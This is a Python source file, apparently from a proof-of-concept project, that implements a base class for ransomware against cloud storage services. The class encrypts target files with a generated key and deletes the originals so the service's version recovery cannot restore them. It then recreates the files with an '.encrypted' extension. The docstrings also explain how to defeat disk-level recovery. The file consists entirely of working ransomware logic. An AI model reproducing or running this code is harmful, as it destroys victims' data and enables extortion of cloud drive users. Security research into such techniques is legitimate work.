import os
import uuid
from cryptography.fernet import Fernet

from doubledrive.cloud_drive.cloud_drive import *

class CloudDriveRansomware:
    """
    A base class for classes that implement a ransomware for a cloud storage service
    """

    def __init__(self, logged_in_cloud_drive: ICloudDriveSession, save_key_path: str):
        """
        Creates a CloudDriveRansomware

        :param logged_in_cloud_drive: An instance of a session with a cloud storage service that is already logged in
        :param save_key_path: Path to save the Fernet encryption/decryption key
        """
        self._cloud_drive = logged_in_cloud_drive
        self.__save_key_path = save_key_path
        self.__key = None

    @abstractmethod
    def _first_stage_overwriting_finished_callback(self, paths_to_encrypted_contents: dict[str, bytes]):
        """
        Callback for when the first stage of overwriting target files with their encrypted contents is done.
        Does not happen if quick_delete mode was set.

        :param paths_to_encrypted_contents: A dict that maps paths that were encrypted to their encrypted contents
        """
        pass

    @abstractmethod
    def _second_stage_deletion_finished_callback(self, paths_to_encrypted_contents: dict[str, bytes]):
        """
        Callback for when the second stage of deleting all target files is done.

        :param paths_to_encrypted_contents: A dict that maps paths that were encrypted to their encrypted contents
        """
        pass

    @abstractmethod
    def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents: dict[str, bytes]):
        """
        Callback for when the third stage of restoring all encrypted files to their original location is done.

        :param paths_to_encrypted_contents: A dict that maps paths that were encrypted to their encrypted contents
        """
        pass

    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], quick_delete: bool = False, file_extension: str = ".encrypted"):
        """
        Starts the ransomware action. This ransomware implementation works in three stages:
        * Encrypt all target files (can be skipped with quick_delete mode)
        * Delete all target files
        * Restore all target file

        The deletion step is very likely to be needed when a cloud ransomware is run because many different cloud services has recovery 
        features for files. Most services will have at least previous versions of Microsoft Office files. Thus, the best way to deal with 
        that is to delete these files and restore them back to their original paths with the new encrypted contents.

        The first stage of encrypting and overwriting the files can be skipped. However, this stage ensures that the files are overwritten
        on the disk itself and cannot later be restored from an MFT entries marked as free. The attacker can also ensure that with another
        way which is creating a huge file on the disk and fill the disk completely and by that ensuring that all free space on the disk is
        overwritten and there is nothing to restore.

        Note - Every time this function run it generates a new Fernet symmetric encryption/decryption key to encrypt files with. The Fernet
        symmetric encryption is used just for PoC and convinience purposes. You are welcome to modify the code to change any other encryption
        method you prefer.

        :param target_cloud_file_items: A list of the target files to encrypt
        :param quick_delete: Whether the first stage of encrypting and overwriting the files should be skipped the file, defaults to False
        :param file_extension: ransomware file extension to add to the encrypted files, defaults to ".encrypted"
        """
        self.__generate_key()
        self.__save_key()
        paths_to_encrypted_contents = self.__create_encrypted_contents_from_cloud_files(target_cloud_file_items)
        
        if not quick_delete:
            for cloud_file_path, file_encrypted_content in paths_to_encrypted_contents.items():
                cloud_drive_item = self._cloud_drive.get_item_by_path(cloud_file_path)
                print(f"Modifying file: {cloud_file_path}")
                self._cloud_drive.modify_file_content(cloud_drive_item, file_encrypted_content)
            self._first_stage_overwriting_finished_callback(paths_to_encrypted_contents)

        for cloud_file in target_cloud_file_items:
            print(f"Deleting file: {cloud_file.full_path}")
            self._cloud_drive.delete_item(cloud_file)
        self._second_stage_deletion_finished_callback(paths_to_encrypted_contents)

        for cloud_file_path, new_file_content in paths_to_encrypted_contents.items():
            print(f"Creating file with encrypted contents: {cloud_file_path}.{file_extension}")
            self._cloud_drive.create_file(f"{cloud_file_path}.{file_extension}", new_file_content)
        self._third_stage_recreation_finished_callback(paths_to_encrypted_contents)

    
    def __save_key(self):
        """
        Saves the Fernet encryption/decryption key to the path given in the constructor.
        """
        with open(self.__save_key_path, "wb") as f:
            f.write(self.__key)

    def __generate_key(self):
        """
        Generates the Fernet symmetric encryption key
        """
        self.__key = Fernet.generate_key()

    def __encrypt_data(self, file_content: bytes) -> bytes:
        """
        Encrypts a bytes buffer using the previously generated Fernet symmetric key

        :param file_content: data to encrypt
        :return: The encrypted data
        """
        return Fernet(self.__key).encrypt(file_content)

    def __create_encrypted_contents_from_cloud_files(self, target_cloud_file_items: list[CloudDriveFileItem]) -> dict[str, bytes]:
        """
        Creates a dictionary mapping of paths of files to encrypt on the cloud storage to their new encrypted contents.

        :param target_cloud_file_items: A list of the files to encrypt.
        :return: The created mapping dictionary
        """
        paths_to_encrypted_contents = {}
        for cloud_file_item in target_cloud_file_items:
            print(f"Generating encrypted contents for file: {cloud_file_item.full_path}")
            file_content = self._cloud_drive.read_file_content(cloud_file_item)
            file_new_content = self.__encrypt_data(file_content)
            paths_to_encrypted_contents[cloud_file_item.full_path] = file_new_content

        return paths_to_encrypted_contents